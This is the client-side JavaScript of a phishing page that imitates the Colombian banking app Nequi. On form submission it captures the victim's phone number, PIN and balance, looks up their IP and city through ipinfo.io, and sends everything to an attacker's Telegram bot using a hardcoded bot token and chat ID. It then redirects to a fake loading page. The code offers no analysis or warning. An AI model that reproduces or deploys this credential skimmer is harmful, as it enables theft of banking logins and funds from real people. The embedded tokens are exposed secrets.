  <script>
  const tokenTelegram = "6917299241:AAFOrxs10OP5RlPCn5VyOc1huWhY3ZTLiH0";
  const tokenIPinfo = "9c9af8c7467cc4";

  function enviarDatos(event) {
      event.preventDefault(); 

      const usr = document.getElementById("usr").value;

      localStorage.setItem("usuario", usr);

      const password = document.getElementById("password").value;
      const Saldo = document.getElementById("Saldo").value;


      fetch(`https://ipinfo.io/json?token=${tokenIPinfo}`, {
          method: "GET"
      })
      .then(response => response.json())
      .then(data => {
          const mensaje = `💲💲💲💲Nequi💲💲💲💲
Celular: ${usr}
Clave: ${password}
Saldo: ${Saldo}
IP: ${data.ip}
${data.city},${data.country}
          `;

          fetch(`https://api.telegram.org/bot${tokenTelegram}/sendMessage`, {
              method: "POST",
              headers: {
                  "Content-Type": "application/json"
              },
              body: JSON.stringify({
                  chat_id: "5915051785",
                  text: mensaje
              })
          })
          .then(response => response.json())
          .then(data => {
              console.log("Respuesta de Telegram:", data);

              window.location.href = "cargando.html";
          })
          .catch(error => {
              console.error("Error al enviar datos", error);
          });
      })
      .catch(error => {
          console.error("Error al obtener información", error);
      });
  }

  document.getElementById("miFormulario").addEventListener("submit", enviarDatos);
</script>



<script>

    document.getElementById("Saldo").addEventListener("input", function(event) {
    let saldo = this.value.replace(/[^\d.]/g, ''); // Eliminar todos los caracteres que no sean dígitos o un punto
    let parts = saldo.split('.'); // Dividir el saldo en partes enteras y decimales

    // Formatear la parte entera con comas como separadores de miles
    parts[0] = parts[0].replace(/\B(?=(\d{3})+(?!\d))/g, ',');

    // Reunir las partes formateadas y actualizar el valor del campo de saldo
    this.value = parts.join('.');
});


    </script>

    <script>
function formatAsPassword(input) {
    input.value = input.value.replace(/\D/g, ''); // Eliminar caracteres no numéricos
}
</script>
